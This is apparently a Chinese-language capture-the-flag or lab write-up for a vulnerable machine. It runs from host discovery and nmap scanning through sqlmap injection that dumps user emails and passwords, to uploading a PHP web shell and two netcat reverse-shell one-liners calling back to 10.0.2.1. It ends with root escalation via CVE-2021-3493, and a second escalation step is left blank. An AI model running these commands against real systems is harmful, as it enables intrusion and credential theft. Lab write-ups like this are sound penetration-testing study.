```
1.主机发现
arp-scan -l
10.0.2.21

2.端口扫描
nmap 10.0.2.21 -p-
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

3.服务扫描
nmap 10.0.2.21 -p22，80，8000 -sV
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
8000/tcp open  http    BaseHTTPServer 0.3 (Python 2.7.15rc1)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

4.web探测
8000端口：
Error response
Error code 501.
Message: Unsupported method ('GET').
Error code explanation: 501 = Server does not support this operation.

web提交数据的方式
 OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT 
这几种提交方式都不支持

80端口
登陆页面，注册页面
登录页面需要账号密码，注册账号并登陆

搜索栏存在sql注入
sqlmap -r target -p query
sqlmap -r target -p query --dbs
sqlmap -r target -p query -D socialnetwork --tables
sqlmap -r target -p query -D socialnetwork -T users --columns      
sqlmap -r target -p query -D socialnetwork -T users -C user_email,user_password --dump
admin@localhost.com (admin)
testuser@localhost.com (testuser) 
拿到用户密码

用户界面有上传头像功能，发现文件上传点
上传shell.php并连接获取www-data权限
反弹shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.0.2.1 3333 >/tmp/f
rm /tmp/d;mknod /tmp/d p;/bin/sh 0< /tmp/f | nc 10.0.2.1 3333 1> /tmp/f
lsb_release -a
Ubuntu 18.04.1 LTS
uname -a
Linux socnet2 4.15.0-38-generic

提权
1.使用cve-2021-3493提权
gcc exploit.c -o exp
上传exp到目标并执行，提权成功

2.






```
